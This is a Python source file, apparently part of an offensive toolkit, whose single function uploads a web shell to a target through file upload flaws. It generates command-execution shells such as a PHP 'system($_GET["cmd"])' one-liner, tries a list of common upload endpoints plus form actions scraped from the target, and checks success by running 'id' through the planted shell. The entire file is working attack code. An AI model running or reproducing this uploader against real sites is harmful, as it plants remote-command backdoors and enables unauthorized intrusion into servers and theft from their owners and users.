"""
Web Shell Uploader — upload a web shell to a target via file upload vulnerability.
"""

import re
from typing import Any

import httpx

_COMMON_UPLOAD_PATHS = [
    "/upload",
    "/api/upload",
    "/api/v1/upload",
    "/file/upload",
    "/upload.php",
    "/uploads",
    "/do_upload",
    "/api/files",
    "/media/upload",
]

_COMMON_SHELL_PATHS = [
    "/uploads/",
    "/files/",
    "/media/",
    "/images/",
    "/img/",
    "/assets/",
    "/tmp/",
    "/cache/",
    "/static/",
]


async def webshell_upload(
    target_url: str,
    shell_code: str = "",
    param_name: str = "file",
    filename: str = "shell.php",
    content_type: str = "application/x-php",
    language: str = "php",
    auto_gen: bool = True,
) -> dict:
    """Upload a web shell to a target via file upload vulnerability.

    Args:
        target_url:   Target URL with upload endpoint.
        shell_code:   Web shell code to upload (if empty, auto-generates basic shell).
        param_name:   Upload form parameter name (default ``"file"``).
        filename:     Filename for the upload (default ``"shell.php"``).
        content_type: MIME type for the upload (default ``"application/x-php"``).
        language:     Shell language for auto-gen (php/jsp/asp/aspx).
        auto_gen:     Auto-generate shell code if none provided (default True).

    Returns:
        A dict with uploaded, shell_url, response_code, response_body, attempts, error.
    """
    result: dict[str, Any] = {
        "uploaded": False,
        "shell_url": "",
        "response_code": 0,
        "response_body": "",
        "attempts": [],
        "error": None,
    }

    if not shell_code and not auto_gen:
        result["error"] = "Either shell_code or auto_gen=True must be provided."
        return result

    if not shell_code and auto_gen:
        if language == "php":
            shell_code = '<?php system($_GET["cmd"]); ?>'
        elif language == "jsp":
            shell_code = '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
        elif language == "asp":
            shell_code = '<% Execute("cmd") %>'
        elif language == "aspx":
            shell_code = '<%@ Page Language="C#" %><% Response.Write("shell"); %>'
        else:
            shell_code = '<?php system($_GET["cmd"]); ?>'

    base = target_url.rstrip("/")
    upload_urls = list(_COMMON_UPLOAD_PATHS)
    upload_urls = [f"{base}{u}" for u in upload_urls]

    async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=True) as client:
        # Discover upload forms on the target page
        try:
            resp = await client.get(base)
            forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\']', resp.text)
            for f in forms:
                fu = f if f.startswith("http") else f"{base.rstrip('/')}/{f.lstrip('/')}"
                upload_urls.append(fu)
            upload_urls = list(dict.fromkeys(upload_urls))
        except Exception:
            pass

        # Try each upload URL
        for upload_url in upload_urls:
            try:
                files = {param_name: (filename, shell_code, content_type)}
                resp = await client.post(upload_url, files=files)

                body_lower = resp.text.lower()[:500]
                success_kw = ["success", "uploaded", "ok", "url", "path", "file", "done"]
                error_kw = ["error", "invalid", "not allowed", "forbidden", "rejected", "denied", "failed"]

                uploaded = any(k in body_lower for k in success_kw) and not any(k in body_lower for k in error_kw)

                # Try to extract uploaded file path from response
                shell_url = ""
                if uploaded:
                    path_match = re.search(r'(?:url|path|file|src|href)["\']?\s*[:=]\s*["\']?([^"\'\s<>]+\.\w+)', resp.text, re.I)
                    if path_match:
                        found_path = path_match.group(1)
                        if found_path.startswith("http"):
                            shell_url = found_path
                        else:
                            shell_url = f"{base.rstrip('/')}/{found_path.lstrip('/')}"

                    if not shell_url:
                        for shell_path in _COMMON_SHELL_PATHS:
                            guess = f"{base.rstrip('/')}{shell_path}{filename}"
                            try:
                                check = await client.get(guess, params={"cmd": "id"})
                                if check.status_code == 200 and ("uid=" in check.text or "root" in check.text.lower()):
                                    shell_url = guess
                                    break
                            except Exception:
                                continue

                attempt = {
                    "url": upload_url,
                    "status": resp.status_code,
                    "uploaded": uploaded,
                    "shell_url": shell_url,
                }
                result["attempts"].append(attempt)

                if uploaded:
                    result["uploaded"] = True
                    result["shell_url"] = shell_url
                    result["response_code"] = resp.status_code
                    result["response_body"] = resp.text[:500]
                    return result

            except Exception as exc:
                result["attempts"].append({
                    "url": upload_url,
                    "status": 0,
                    "uploaded": False,
                    "error": str(exc),
                })

    if not result["uploaded"]:
        result["error"] = "Upload failed on all attempted endpoints."
        result["response_code"] = result["attempts"][-1].get("status", 0) if result["attempts"] else 0

    return result
